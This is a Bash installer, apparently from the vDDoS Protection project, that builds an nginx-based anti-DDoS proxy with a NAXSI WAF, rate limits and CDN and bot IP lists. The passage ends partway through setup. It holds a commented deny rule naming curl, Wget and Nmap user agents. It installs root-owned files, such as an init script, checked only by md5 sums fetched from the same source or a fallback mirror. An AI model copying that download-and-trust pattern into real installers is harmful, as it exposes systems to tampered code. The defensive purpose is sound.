#!/bin/bash

################## Định nghĩa hàm kiểm tra có cài vddos chưa:
function checknoninstallvddos()
{
if [ ! -f /vddos/vddos ]; then
	echo 'ERROR! vDDoS service is not installed! 
Please run command "vddos setup" to installing vDDoS service for the first time into /vddos!'
	exit 0
fi
return 0
}


function checkalreadyinstalledvddos()
{
if [ -f /vddos/vddos  ]; then
	echo 'ERROR! vDDoS service is already installed! 
Please run command "vddos help" to learn Command Line Usage vDDoS!'
	exit 0
fi
return 0
}
################## Định nghĩa hàm tính toán khả năng chịu đựng của vDDoS:
function checkDefensiveAbilityvddos()
{
worker_processes=`cat /proc/cpuinfo | grep processor | wc -l`
worker_connections=`ulimit -n`
keepalive_timeout=15
DefensiveAbility=$(((worker_processes*worker_connections)/(keepalive_timeout*2)))
return 0
}
################## Định nghĩa hàm khởi động lại Captcha Server:
function restartcaptchaserver()
{
pidcaptchaserver=`netstat -lntup|grep :10101 |awk {'print $7'}   | sed 's/\/python2.7//g'`  >/dev/null 2>&1 ;
(kill $pidcaptchaserver &) &
cd /vddos/captcha ;
(sh start.sh &) &
sleep 1 ;
return 0
}
################## Định nghĩa hàm tắt Captcha Server:
function stopcaptchaserver()
{
pidcaptchaserver=`netstat -lntup|grep :10101 |awk {'print $7'}   | sed 's/\/python2.7//g'`  >/dev/null 2>&1 ;
(kill $pidcaptchaserver &) &
sleep 1 ;
return 0
}









################## Nhận lệnh "vddos setup|start|stop|restart"
lenh=$1
debug='>/dev/null 2>&1'
debug=''


################## Nếu gõ "vddos setup"
if [ $lenh == "setup" ]; then

	
	if [ ! -f /etc/redhat-release ]; then
		echo 'ERROR! Recommend use CentOS Linux release 7 x86_64!
		'
		exit 0
	fi
	
	if [ `arch` != "x86_64" ]; then
		echo 'ERROR! Recommend use CentOS Linux release 7 x86_64!
		'
		exit 0
	fi

	if [ $(id -u) != "0" ]; then
		echo 'ERROR! Please "su root" and try again!
		'
		exit 0
	fi

	vddosver='1.13.6'
	nginxver='1.13.6'
	opensslver='openssl-1.0.2l'
	pythonver='Python-2.7.14'
	osrelease=$(grep -o "[0-9]" /etc/redhat-release |head -n1) # Là bản 5 6 hay 7

	if [ $osrelease != "5" ] && [ $osrelease != "6" ] && [ $osrelease != "7" ]; then
		echo 'ERROR! Recommend use CentOS Linux release 7 x86_64!
		'
		exit 0
	fi




	
	checkalreadyinstalledvddos
	echo 'Start installing vDDoS service for the first time into /vddos'
	echo -n '...'
	yum -y install epel-release  >/dev/null 2>&1
	yum -y install nano net-tools curl psmisc wget gc gcc gcc-c++ pcre-devel zlib-devel make wget openssl-devel libxml2-devel libxslt-devel gd-devel perl-ExtUtils-Embed GeoIP-devel gperftools gperftools-devel libatomic_ops-devel perl-ExtUtils-Embed  >/dev/null 2>&1
	yum -y install nano net-tools gcc automake autoconf apr-util-devel gc gcc gcc-c++ pcre-devel zlib-devel make wget openssl-devel libxml2-devel libxslt-devel gd-devel perl-ExtUtils-Embed GeoIP-devel gperftools gperftools-devel libatomic_ops-devel perl-ExtUtils-Embed  >/dev/null 2>&1
	sleep 5
	yum -y install epel-release  >/dev/null 2>&1
	yum -y install nano net-tools curl wget gc gcc gcc-c++ pcre-devel zlib-devel make wget openssl-devel libxml2-devel libxslt-devel gd-devel perl-ExtUtils-Embed GeoIP-devel gperftools gperftools-devel libatomic_ops-devel perl-ExtUtils-Embed  >/dev/null 2>&1
	yum -y install screen htop iotop iptraf nano net-tools gcc automake autoconf apr-util-devel gc gcc gcc-c++ pcre-devel zlib-devel make wget openssl-devel libxml2-devel libxslt-devel gd-devel perl-ExtUtils-Embed GeoIP-devel gperftools gperftools-devel libatomic_ops-devel perl-ExtUtils-Embed  >/dev/null 2>&1
	sleep 5
	echo 'Installing Prepare Package success!'
	echo -n '...'
	if [ ! -f vddos-$vddosver.tar.gz ]; then
		cd /
		curl -L https://github.com/duy13/vDDoS-Protection/raw/master/vddos-$vddosver.tar.gz -o vddos-$vddosver.tar.gz --silent
		goc=`curl -L https://raw.githubusercontent.com/duy13/vDDoS-Protection/master/md5sum.txt --silent | grep "vddos-$vddosver.tar.gz" |awk 'NR==1 {print $1}'`
		tai=`md5sum /vddos-$vddosver.tar.gz | awk 'NR==1 {print $1}'`
		if [ "$goc" != "$tai" ]; then
			rm -rf vddos-$vddosver.tar.gz
			curl -L https://3.voduy.com/vDDoS-Proxy-Protection/vddos-$vddosver.tar.gz -o vddos-$vddosver.tar.gz --silent
		fi

		tai=`md5sum /vddos-$vddosver.tar.gz | awk 'NR==1 {print $1}'`
		if [ "$goc" != "$tai" ]; then
			echo 'ERROR! Can not download vDDoS Source Install!
			' 
			rm -rf vddos-$vddosver.tar.gz
			exit 0
		fi
		tar -xvf vddos-$vddosver.tar.gz  >/dev/null 2>&1
		rm -rf vddos-$vddosver.tar.gz  >/dev/null 2>&1
	else
		rm -rf /vddos-$vddosver.tar.gz
		cp vddos-$vddosver.tar.gz /
		cd /
		tar -xvf vddos-$vddosver.tar.gz  >/dev/null 2>&1
		rm -rf vddos-$vddosver.tar.gz  >/dev/null 2>&1
	fi


	cd /vddos/vdos  >/dev/null 2>&1

	if [ $osrelease = '7' ]; then
	./configure  --prefix=/vddos  --sbin-path=/vddos/vddos --modules-path=/usr/lib64/vddos/modules --conf-path=/vddos/vddos.conf --error-log-path=/var/log/vddos/error.log --http-log-path=/var/log/vddos/access.log --pid-path=/var/run/vddos.pid --lock-path=/var/run/vddos.lock --http-client-body-temp-path=/var/cache/vddos/client_temp --http-proxy-temp-path=/var/cache/vddos/proxy_temp --without-http_fastcgi_module --without-http_uwsgi_module --without-http_scgi_module --without-http_memcached_module --user=vddos --group=vddos --with-compat --with-file-aio --with-threads --with-stream --with-http_realip_module --with-http_ssl_module --with-http_v2_module --with-cc-opt='-O2 -g -pipe -Wall -Wp,-D_FORTIFY_SOURCE=2 -fexceptions -fstack-protector-strong --param=ssp-buffer-size=4 -grecord-gcc-switches -m64 -mtune=generic -fPIC' --with-ld-opt='-Wl,-z,relro -Wl,-z,now -pie' --with-http_geoip_module --with-stream_geoip_module --with-http_stub_status_module --add-module=vts --add-module=sts --add-module=sts-core --add-module=waf/naxsi_src  --add-module=testcookie --with-openssl=/vddos/$opensslver  >/dev/null 2>&1	
	fi
	if [ $osrelease = '6' ]; then
	./configure  --prefix=/vddos  --sbin-path=/vddos/vddos --modules-path=/usr/lib64/vddos/modules --conf-path=/vddos/vddos.conf --error-log-path=/var/log/vddos/error.log --http-log-path=/var/log/vddos/access.log --pid-path=/var/run/vddos.pid --lock-path=/var/run/vddos.lock --http-client-body-temp-path=/var/cache/vddos/client_temp --http-proxy-temp-path=/var/cache/vddos/proxy_temp --without-http_fastcgi_module --without-http_uwsgi_module --without-http_scgi_module --without-http_memcached_module --user=vddos --group=vddos --with-compat --with-file-aio --with-threads --with-stream --with-http_realip_module --with-http_ssl_module --with-http_v2_module --with-cc-opt='-O2 -g -pipe -Wall -Wp,-D_FORTIFY_SOURCE=2 -fexceptions -fstack-protector --param=ssp-buffer-size=4 -m64 -mtune=generic -fPIC' --with-ld-opt='-Wl,-z,relro -Wl,-z,now -pie' --with-http_geoip_module --with-stream_geoip_module --with-http_stub_status_module --add-module=vts --add-module=sts --add-module=sts-core --add-module=waf/naxsi_src  --add-module=testcookie --with-openssl=/vddos/$opensslver >/dev/null 2>&1 >/dev/null 2>&1
	fi
	if [ $osrelease = '5' ]; then
	./configure  --prefix=/vddos  --sbin-path=/vddos/vddos --modules-path=/usr/lib64/vddos/modules --conf-path=/vddos/vddos.conf --error-log-path=/var/log/vddos/error.log --http-log-path=/var/log/vddos/access.log --pid-path=/var/run/vddos.pid --lock-path=/var/run/vddos.lock --http-client-body-temp-path=/var/cache/vddos/client_temp --http-proxy-temp-path=/var/cache/vddos/proxy_temp --http-fastcgi-temp-path=/var/cache/vddos/fastcgi_temp --http-uwsgi-temp-path=/var/cache/vddos/uwsgi_temp --http-scgi-temp-path=/var/cache/vddos/scgi_temp --user=vddos --group=vddos --with-file-aio --with-threads --with-http_addition_module --with-http_auth_request_module --with-http_dav_module --with-http_flv_module --with-http_gunzip_module --with-http_gzip_static_module --with-http_mp4_module --with-http_random_index_module --with-http_realip_module --with-http_secure_link_module --with-http_slice_module --with-http_ssl_module --with-http_stub_status_module --with-http_sub_module --with-http_v2_module --with-mail --with-mail_ssl_module --with-stream --with-stream_ssl_module --with-cc-opt='-O2 -g -pipe -Wp,-D_FORTIFY_SOURCE=2 -fexceptions -fstack-protector --param=ssp-buffer-size=4 -m64 -mtune=generic' --with-http_geoip_module --with-stream_geoip_module --with-http_stub_status_module --add-module=vts --add-module=sts --add-module=sts-core --add-module=waf/naxsi_src  --add-module=testcookie --with-openssl=/vddos/$opensslver  >/dev/null 2>&1
	fi

	sleep 15	
	s='./config --prefix=/vddos/openssl-1.0.2l/.openssl no-shared' ; r='./config --prefix=/vddos/openssl-1.0.2l/.openssl no-shared -fPIC'
	sed -i "s#$s#$r#g" /vddos/vdos/objs/Makefile  >/dev/null 2>&1
	make  >/dev/null 2>&1
	sleep 15
	make install  >/dev/null 2>&1
	sleep 15
	ln -s /usr/lib64/vddos/modules /vddos/modules  >/dev/null 2>&1
	useradd -d /vddos -s /sbin/nologin vddos  >/dev/null 2>&1
	mkdir -p /vddos/conf.d  >/dev/null 2>&1
	mv /vddos/vdos/waf/naxsi_config/naxsi_core.rules /vddos/   >/dev/null 2>&1
	rm -rf /vddos/vdos  >/dev/null 2>&1
	rm -rf /vddos/*default  >/dev/null 2>&1
	rm -rf /vddos/$opensslver >/dev/null 2>&1
	echo '
# Cloudflare
set_real_ip_from 103.21.244.0/22;
set_real_ip_from 103.22.200.0/22;
set_real_ip_from 103.31.4.0/22;
set_real_ip_from 104.16.0.0/12;
set_real_ip_from 108.162.192.0/18;
set_real_ip_from 131.0.72.0/22;
set_real_ip_from 141.101.64.0/18;
set_real_ip_from 162.158.0.0/15;
set_real_ip_from 172.64.0.0/13;
set_real_ip_from 173.245.48.0/20;
set_real_ip_from 188.114.96.0/20;
set_real_ip_from 190.93.240.0/20;
set_real_ip_from 197.234.240.0/22;
set_real_ip_from 198.41.128.0/17;
set_real_ip_from 199.27.128.0/21;


# Incapsula
set_real_ip_from 199.83.128.0/21;
set_real_ip_from 198.143.32.0/19;
set_real_ip_from 149.126.72.0/21;
set_real_ip_from 103.28.248.0/22;
set_real_ip_from 185.11.124.0/22;
set_real_ip_from 192.230.64.0/18;


# Google IPs IPv4
set_real_ip_from 216.239.32.0/19;
set_real_ip_from 64.233.160.0/19;
set_real_ip_from 66.249.80.0/20;
set_real_ip_from 72.14.192.0/18;
set_real_ip_from 209.85.128.0/17;
set_real_ip_from 66.102.0.0/20;
set_real_ip_from 74.125.0.0/16;
set_real_ip_from 64.18.0.0/20;
set_real_ip_from 207.126.144.0/20;
set_real_ip_from 173.194.0.0/16;

real_ip_header X-Forwarded-For;
	' > /vddos/conf.d/cdn-ip.conf
	cp /vddos/conf.d/cdn-ip.conf /vddos/conf.d/cdn-ip.conf.default



	echo '	# Alexa Bot IP Addresses
204.236.235.245; 75.101.186.145;

	# Baidu Bot IP Addresses
180.76.15.0/24; 119.63.196.0/24; 115.239.212.0/24; 119.63.199.0/24; 122.81.208.0/22; 123.125.71.0/24; 180.76.4.0/24; 180.76.5.0/24; 180.76.6.0/24; 185.10.104.0/24; 220.181.108.0/24; 220.181.51.0/24; 111.13.202.0/24; 123.125.67.144/29; 123.125.67.152/31; 61.135.169.0/24; 123.125.68.68/30; 123.125.68.72/29; 123.125.68.80/28; 123.125.68.96/30; 202.46.48.0/20; 220.181.38.0/24; 123.125.68.80/30; 123.125.68.84/31; 123.125.68.0/24;

	# Bing Bot IP Addresses
65.52.104.0/24; 65.52.108.0/22; 65.55.24.0/24; 65.55.52.0/24; 65.55.55.0/24; 65.55.213.0/24; 65.55.217.0/24; 131.253.24.0/22; 131.253.46.0/23; 40.77.167.0/24; 199.30.27.0/24; 157.55.16.0/23; 157.55.18.0/24; 157.55.32.0/22; 157.55.36.0/24; 157.55.48.0/24; 157.55.109.0/24; 157.55.110.40/29; 157.55.110.48/28; 157.56.92.0/24; 157.56.93.0/24; 157.56.94.0/23; 157.56.229.0/24; 199.30.16.0/24; 207.46.12.0/23; 207.46.192.0/24; 207.46.195.0/24; 207.46.199.0/24; 207.46.204.0/24; 157.55.39.0/24;

	# Duckduck Bot IP Addresses
46.51.197.88; 46.51.197.89; 50.18.192.250; 50.18.192.251; 107.21.1.61; 176.34.131.233; 176.34.135.167; 184.72.106.52; 184.72.115.86;

	# Facebook Bot IP Addresses
31.13.97.0/24; 31.13.99.0/24; 31.13.200.0/24; 66.220.144.0/20; 69.63.189.0/24; 69.63.190.0/24; 69.171.224.0/20; 69.171.240.0/21; 69.171.248.0/24; 173.252.73.0/24; 173.252.74.0/24; 173.252.77.0/24; 173.252.100.0/22; 173.252.104.0/21; 173.252.112.0/24; 2a03:2880:10::/48; 2a03:2880:11::/48; 2a03:2880:20::/48; 2a03:2880:1010::/48; 2a03:2880:1020::/48; 2a03:2880:2020::/48; 2a03:2880:2050::/48; 2a03:2880:2040::/48; 2a03:2880:2110::/48; 2a03:2880:2130::/48; 2a03:2880:3010::/48; 2a03:2880:3020::/48;

	# Google Bot IP Addresses
203.208.60.0/24; 66.249.64.0/20; 72.14.199.0/24; 209.85.238.0/24; 66.249.90.0/24; 66.249.91.0/24; 66.249.92.0/24; 2001:4860:4801:1::/64; 2001:4860:4801:2::/64; 2001:4860:4801:3::/64; 2001:4860:4801:4::/64; 2001:4860:4801:5::/64; 2001:4860:4801:6::/64; 2001:4860:4801:7::/64; 2001:4860:4801:8::/64; 2001:4860:4801:9::/64; 2001:4860:4801:a::/64; 2001:4860:4801:b::/64; 2001:4860:4801:c::/64; 2001:4860:4801:d::/64; 2001:4860:4801:e::/64; 2001:4860:4801:2001::/64; 2001:4860:4801:2002::/64;

	# Sogou Bot IP Addresses
220.181.125.0/24; 123.126.51.64/27; 123.126.51.96/28; 123.126.68.25; 61.135.189.74; 61.135.189.75;

	# Yahoo Bot IP Addresses
67.195.37.0/24; 67.195.50.0/24; 67.195.110.0/24; 67.195.111.0/24; 67.195.112.0/23; 67.195.114.0/24; 67.195.115.0/24; 68.180.224.0/21; 72.30.132.0/24; 72.30.142.0/24; 72.30.161.0/24; 72.30.196.0/24; 72.30.198.0/24; 74.6.254.0/24; 74.6.8.0/24; 74.6.13.0/24; 74.6.17.0/24; 74.6.18.0/24; 74.6.22.0/24; 74.6.27.0/24; 98.137.72.0/24; 98.137.206.0/24; 98.137.207.0/24; 98.139.168.0/24; 114.111.95.0/24; 124.83.159.0/24; 124.83.179.0/24; 124.83.223.0/24; 183.79.63.0/24; 183.79.92.0/24; 203.216.255.0/24; 211.14.11.0/24;

	# Yandex Bot IP Addresses
100.43.90.0/24; 37.9.115.0/24; 37.140.165.0/24; 77.88.22.0/25; 77.88.29.0/24; 77.88.31.0/24; 77.88.59.0/24; 84.201.146.0/24; 84.201.148.0/24; 84.201.149.0/24; 87.250.243.0/24; 87.250.253.0/24; 93.158.147.0/24; 93.158.148.0/24; 93.158.151.0/24; 93.158.153.0/32; 95.108.128.0/24; 95.108.138.0/24; 95.108.150.0/23; 95.108.158.0/24; 95.108.156.0/24; 95.108.188.128/25; 95.108.234.0/24; 95.108.248.0/24; 100.43.80.0/24; 130.193.62.0/24; 141.8.153.0/24; 178.154.165.0/24; 178.154.166.128/25; 178.154.173.29; 178.154.200.158; 178.154.202.0/24; 178.154.205.0/24; 178.154.239.0/24; 178.154.243.0/24; 37.9.84.253; 199.21.99.99; 178.154.162.29; 178.154.203.251; 178.154.211.250; 95.108.246.252; 5.45.254.0/24; 5.255.253.0/24; 37.140.141.0/24; 37.140.188.0/24; 100.43.81.0/24; 100.43.85.0/24; 100.43.91.0/24; 199.21.99.0/24;

	# Youdao Bot IP Addresses
61.135.249.200/29; 61.135.249.208/28;
' > /vddos/conf.d/whitelist-botsearch.conf
	cp /vddos/conf.d/whitelist-botsearch.conf /vddos/conf.d/whitelist-botsearch.conf.default


	echo 'geoip_country /usr/share/GeoIP/GeoIP.dat;
map $geoip_country_code $allowed_country {
	default yes;
	# US yes;
	# TK no;
	
}
# deny 10.9.8.7;
' > /vddos/conf.d/blacklist-countrycode.conf
	cp /vddos/conf.d/blacklist-countrycode.conf /vddos/conf.d/blacklist-countrycode.conf.default

	
	echo "# Log format
    log_format  main    '\$remote_addr - \$remote_user [\$time_local] "'"$request"'"'" > /vddos/conf.d/logs.conf

	echo "                        '"'"$status"'" \$body_bytes_sent  "'"$http_referer"'" '
                        '"'"$http_user_agent"'" "'"$http_x_forwarded_for"'" "'"$scheme://$host:$server_port$request_uri"'"' ; " >> /vddos/conf.d/logs.conf

	echo "    log_format  bytes   '\$body_bytes_sent';" >> /vddos/conf.d/logs.conf
	echo '    access_log          /var/log/vddos/access.log  main;
    access_log on;' >> /vddos/conf.d/logs.conf
	
	echo '# Limit conn
limit_conn_zone $binary_remote_addr zone=perip:10m;
limit_conn perip 50;
limit_conn_status 444;
limit_req_zone $binary_remote_addr zone=dyn:10m rate=50r/s;
limit_req zone=dyn burst=50;
limit_req_status 444;
' > /vddos/conf.d/limit-conn.conf

	echo '
############################ WAF NAXSI

#### Enable of Disable:
#SecRulesEnabled;
DeniedUrl "/444.html";

#### Ban after:
CheckRule "$SQL >= 8" BLOCK;
CheckRule "$RFI >= 8" BLOCK;
CheckRule "$TRAVERSAL >= 4" BLOCK;
CheckRule "$EVADE >= 4" BLOCK;
CheckRule "$XSS >= 8" BLOCK;

############################ Ban Bad Client:
#if ($http_user_agent ~* "PHP|curl|Wget|HTTrack|Nmap|Verifying|PingBack|Pingdom|Joomla|Wordpress") { return 444; }
#if ($http_user_agent = "") { return 444; }
#if ($http_user_agent = " ") { return 444; }
#if ($http_user_agent = "-") { return 444; }
#if ($http_user_agent ~* "\b(proxy|hide|sock|free|check|trans|ping)\b") { return 444; }
#if ($http_referer ~* "\b(hide|sock|free|check|trans|ping|speed|test)\b") { return 444; }

' > /vddos/conf.d/waf.conf
	cp /vddos/conf.d/waf.conf /vddos/conf.d/waf.conf.default




	####### Chức năng Redirect
    echo 'set $schemedomain "${scheme}://${host}"; # Please Do not remove this line!


#############################################################################################
############## Redirect NON-SSL to SSL for your domain: 
############## (http://your-domain.com to HTTPS://your-domain.com)
#if ($schemedomain = "http://your-domain.com") {
#    return 301 https://your-domain.com$request_uri;
#}

#############################################################################################
############## Redirect WWW to NON-WWW for your domain: 
############## (http://WWW.your-domain.com to http://your-domain.com)
#if ($schemedomain = "http://www.your-domain.com") {
#    return 301 http://your-domain.com$request_uri;
#}

#############################################################################################
############## Redirect DOMAIN to OTHER-DOMAIN for your domain: 
############## (http://your-domain.COM to http://your-domain.ORG)
#if ($schemedomain = "http://www.your-domain.com") {
#    return 301 http://your-domain.org$request_uri;
#}

#############################################################################################
############## NON-Security for whitelist directories of your domain: 
############## (NON-Security for http://your-domain.com/secret/folder)
#location /secret/folder {
#	proxy_set_header   Host             $host;
#	proxy_set_header   X-Real-IP        $remote_addr;
#	proxy_set_header   X-Forwarded-For  $proxy_add_x_forwarded_for;
#   proxy_pass      http://72.13.44.113:80;
#}

' > /vddos/conf.d/redirect.conf
    cp /vddos/conf.d/redirect.conf /vddos/conf.d/redirect.conf.default

    ####### Chức năng LOAD Balancing:
    echo '# Example create a backend name "backend1-nonssl" for "website.conf" from 3 server:

#	upstream backend1-nonssl {
#		least_conn;
#		ip_hash;
#		server 204.79.197.200:80 max_fails=3 fail_timeout=5s;
#		server 107.154.75.41:80 max_fails=3 fail_timeout=5s;
#		server 104.20.44.114:80 max_fails=3 fail_timeout=5s;
#	}

# Example create a backend name "backend1-ssl" for "website.conf" from 3 server:
#	upstream backend1-ssl {
#		least_conn;
#		hash $remote_addr$http_user_agent;
#		server 204.79.197.200:443 max_fails=3 fail_timeout=5s;
#		server 107.154.75.41:443 max_fails=3 fail_timeout=5s;
#		server 104.20.44.114:443 max_fails=3 fail_timeout=5s;
#	}
' > /vddos/conf.d/load-balancing.conf
    cp /vddos/conf.d/load-balancing.conf /vddos/conf.d/load-balancing.conf.default

echo '#stream {
#server_traffic_status_zone;
#geoip_country    /usr/share/GeoIP/GeoIP.dat;
#server_traffic_status_filter_by_set_key $geoip_country_code country::*;
#limit_conn_zone $binary_remote_addr zone=ip_addr:10m; # Limit perip
	
#### DNS Load-balancing multiple backend:
#	upstream backend_dns {
#		hash $remote_addr consistent;
#		server 8.8.8.8:53 max_fails=3 fail_timeout=5s;
#		server 8.8.4.4:53 max_fails=3 fail_timeout=5s;
#   }


#### TCP Proxy for Port 53:
#	server {
#		listen 0.0.0.0:53;
#		limit_conn ip_addr 1; 		# Limit perip 1 (conn/s)
#		proxy_download_rate 100k;	# Limit Download 100 (KB/s)
#		proxy_upload_rate   100k;	# Limit Upload 100 (KB/s)
#		proxy_pass backend_dns;		# Reverse proxy to backend_name
#		server_traffic_status_filter_by_set_key $remote_addr ip_addr::$server_addr:$server_port;
#	}


#### UDP Proxy for Port 53:
#	server {
#		listen 0.0.0.0:53 udp;
#		limit_conn ip_addr 1; 		# Limit perip 1 (conn/s)
#		proxy_download_rate 100k;	# Limit Download 100 (KB/s)
#		proxy_upload_rate   100k;	# Limit Upload 100 (KB/s)
#		proxy_pass backend_dns;		# Reverse proxy to backend_name
#		server_traffic_status_filter_by_set_key $remote_addr ip_addr::$server_addr:$server_port;
#	}


#}
' > /vddos/conf.d/tcp-udp-proxy.conf
cp -r /vddos/conf.d/tcp-udp-proxy.conf /vddos/conf.d/tcp-udp-proxy.conf.default


	echo '# Website       Listen            Backend               Cache  Security  SSL-Prikey  SSL-CRTkey
your-domain.com	http://0.0.0.0:80 http://204.79.197.200:80 no     5s       no          no
your-domain.com https://0.0.0.0:443  https://204.79.197.200:443  no    captcha    /vddos/ssl/your-domain.com.pri /vddos/ssl/your-domain.com.crt
' > /vddos/conf.d/website.conf
	echo '# Example:
# nano /vddos/conf.d/website.conf
# Website       Listen               Backend                  Cache Security SSL-Prikey   SSL-CRTkey
your-domain.com http://0.0.0.0:80    http://108.177.12.138:80    no    307    no           no
your-domain.com https://0.0.0.0:443  https://108.177.12.138:443  no    200    /vddos/ssl/your-domain.com.pri /vddos/ssl/your-domain.com.crt
your-domain.com http://0.0.0.0:8080  http://backend1-nonssl		yes   click   /vddos/ssl/your-domain.com.pri /vddos/ssl/your-domain.com.crt
your-domain.com https://0.0.0.0:4443 https://103.28.249.200:443 yes   high    /vddos/ssl/your-domain.com.pri /vddos/ssl/your-domain.com.crt
your-domain.com https://0.0.0.0:4444 https://backend1-ssl		yes   no    /vddos/ssl/your-domain.com.pri /vddos/ssl/your-domain.com.crt
	' > /vddos/conf.d/website.conf.example

	rm -rf /vddos/vddos.conf

	curl -L https://raw.githubusercontent.com/duy13/vDDoS-Protection/master/vdos.sh.txt -o /etc/init.d/vdos --silent
	goc=`curl -L https://raw.githubusercontent.com/duy13/vDDoS-Protection/master/md5sum.txt --silent | grep "vdos.sh.txt" |awk 'NR==1 {print $1}'`
	tai=`md5sum /etc/init.d/vdos | awk 'NR==1 {print $1}'`
	if [ "$goc" != "$tai" ]; then
		rm -rf /etc/init.d/vdos
		curl -L https://3.voduy.com/vDDoS-Proxy-Protection/vdos.sh.txt -o /etc/init.d/vdos --silent
	fi
	chmod 700 /etc/init.d/vdos

	# Tạo root doc html https://raw.githubusercontent.com/duy13/vDDoS-Protection/master/aes.min.js.txt
	mkdir -p /vddos/html
	curl -L https://raw.githubusercontent.com/duy13/vDDoS-Protection/master/aes.min.js.txt -o /vddos/html/aes.min.js --silent
	goc=`curl -L https://raw.githubusercontent.com/duy13/vDDoS-Protection/master/md5sum.txt --silent | grep "aes.min.js.txt" |awk 'NR==1 {print $1}'`
	tai=`md5sum /vddos/html/aes.min.js | awk 'NR==1 {print $1}'`
	if [ "$goc" != "$tai" ]; then
		rm -rf /vddos/html/aes.min.js
		curl -L https://3.voduy.com/vDDoS-Proxy-Protection/aes.min.js.txt -o /vddos/html/aes.min.js --silent
	fi

	curl -L https://raw.githubusercontent.com/duy13/vDDoS-Protection/master/vddosw3data.js.txt -o /vddos/html/vddosw3data.js --silent
	goc=`curl -L https://raw.githubusercontent.com/duy13/vDDoS-Protection/master/md5sum.txt --silent | grep "vddosw3data.js.txt" |awk 'NR==1 {print $1}'`
	tai=`md5sum /vddos/html/vddosw3data.js | awk 'NR==1 {print $1}'`
	if [ "$goc" != "$tai" ]; then
		rm -rf /vddos/html/vddosw3data.js
		curl -L https://3.voduy.com/vDDoS-Proxy-Protection/vddosw3data.js.txt -o /vddos/html/vddosw3data.js --silent
	fi


 	curl -L https://raw.githubusercontent.com/duy13/vDDoS-Protection/master/html/captcha.html.txt -o /vddos/html/captcha.html --silent
	goc=`curl -L https://raw.githubusercontent.com/duy13/vDDoS-Protection/master/md5sum.txt --silent | grep "captcha.html.txt" |awk 'NR==1 {print $1}'`
	tai=`md5sum /vddos/html/captcha.html | awk 'NR==1 {print $1}'`
	if [ "$goc" != "$tai" ]; then
		rm -rf /vddos/html/captcha.html
		curl -L https://3.voduy.com/vDDoS-Proxy-Protection/html/captcha.html.txt -o /vddos/html/captcha.html --silent
	fi
	cp /vddos/html/captcha.html /vddos/html/captcha.html.default

	curl -L https://raw.githubusercontent.com/duy13/vDDoS-Protection/master/html/5s.html.txt -o /vddos/html/5s.html --silent
	goc=`curl -L https://raw.githubusercontent.com/duy13/vDDoS-Protection/master/md5sum.txt --silent | grep "5s.html.txt" |awk 'NR==1 {print $1}'`
	tai=`md5sum /vddos/html/5s.html | awk 'NR==1 {print $1}'`
	if [ "$goc" != "$tai" ]; then
		rm -rf /vddos/html/5s.html
		curl -L https://3.voduy.com/vDDoS-Proxy-Protection/html/5s.html.txt -o /vddos/html/5s.html --silent
	fi
	cp /vddos/html/5s.html /vddos/html/5s.html.default
	
	rm -rf /vddos/html/index.html
	curl -L https://raw.githubusercontent.com/duy13/vDDoS-Protection/master/html/cookies.html.txt -o /vddos/html/cookies.html --silent
	goc=`curl -L https://raw.githubusercontent.com/duy13/vDDoS-Protection/master/md5sum.txt --silent | grep "cookies.html.txt" |awk 'NR==1 {print $1}'`
	tai=`md5sum /vddos/html/cookies.html | awk 'NR==1 {print $1}'`
	if [ "$goc" != "$tai" ]; then
		rm -rf /vddos/html/cookies.html
		curl -L https://3.voduy.com/vDDoS-Proxy-Protection/html/cookies.html.txt -o /vddos/html/cookies.html --silent
	fi	

	# Tạo Error Page
	mkdir -p /vddos/html/error

	curl -L https://raw.githubusercontent.com/duy13/vDDoS-Protection/master/html/5xx.html.txt -o /vddos/html/error/5xx.html --silent
	goc=`curl -L https://raw.githubusercontent.com/duy13/vDDoS-Protection/master/md5sum.txt --silent | grep "5xx.html.txt" |awk 'NR==1 {print $1}'`
	tai=`md5sum /vddos/html/error/5xx.html | awk 'NR==1 {print $1}'`
	if [ "$goc" != "$tai" ]; then
		rm -rf /vddos/html/error/5xx.html
		curl -L https://3.voduy.com/vDDoS-Proxy-Protection/html/5xx.html.txt -o /vddos/html/error/5xx.html --silent
	fi

	curl -L https://raw.githubusercontent.com/duy13/vDDoS-Protection/master/html/4xx.html.txt -o /vddos/html/error/4xx.html --silent
	goc=`curl -L https://raw.githubusercontent.com/duy13/vDDoS-Protection/master/md5sum.txt --silent | grep "4xx.html.txt" |awk 'NR==1 {print $1}'`
	tai=`md5sum /vddos/html/error/4xx.html | awk 'NR==1 {print $1}'`
	if [ "$goc" != "$tai" ]; then
		rm -rf /vddos/html/error/4xx.html
		curl -L https://3.voduy.com/vDDoS-Proxy-Protection/html/4xx.html.txt -o /vddos/html/error/4xx.html --silent
	fi

	curl -L https://raw.githubusercontent.com/duy13/vDDoS-Protection/master/html/403.html.txt -o /vddos/html/error/403.html --silent
	goc=`curl -L https://raw.githubusercontent.com/duy13/vDDoS-Protection/master/md5sum.txt --silent | grep "403.html.txt" |awk 'NR==1 {print $1}'`
	tai=`md5sum /vddos/html/error/403.html | awk 'NR==1 {print $1}'`
	if [ "$goc" != "$tai" ]; then
		rm -rf /vddos/html/error/403.html
		curl -L https://3.voduy.com/vDDoS-Proxy-Protection/html/403.html.txt -o /vddos/html/error/403.html --silent
	fi

	curl -L https://raw.githubusercontent.com/duy13/vDDoS-Protection/master/html/404.html.txt -o /vddos/html/error/404.html --silent
	goc=`curl -L https://raw.githubusercontent.com/duy13/vDDoS-Protection/master/md5sum.txt --silent | grep "404.html.txt" |awk 'NR==1 {print $1}'`
	tai=`md5sum /vddos/html/error/404.html | awk 'NR==1 {print $1}'`
	if [ "$goc" != "$tai" ]; then
		rm -rf /vddos/html/error/404.html
		curl -L https://3.voduy.com/vDDoS-Proxy-Protection/html/404.html.txt -o /vddos/html/error/404.html --silent
	fi





	# Tạo SSL tự chứng:
	mkdir -p /vddos/ssl
	openssl req -x509 -nodes -days 3650 -newkey rsa:2048 -keyout /vddos/ssl/your-domain.com.pri -out /vddos/ssl/your-domain.com.crt -subj "/C=US/ST=your-domain.com/L=your-domain.com/O=your-domain.com/OU=vddos.voduy.com/CN=your-domain.com"  >/dev/null 2>&1
	chmod -R 750 /vddos/ssl


	# Tạo Captcha Server
	rm -rf /opt/$pythonver
	mv /vddos/$pythonver /opt
	cd /opt/$pythonver
	./configure --prefix=/usr/local  >/dev/null 2>&1
	sleep 15
	make  >/dev/null 2>&1
	sleep 15
	make altinstall  >/dev/null 2>&1
	sleep 15
	ln -s /usr/local/bin/python2.7 /usr/local/bin/python  >/dev/null 2>&1
	source ~/.bashrc
	curl -L https://bootstrap.pypa.io/ez_setup.py -o ez_setup.py --silent
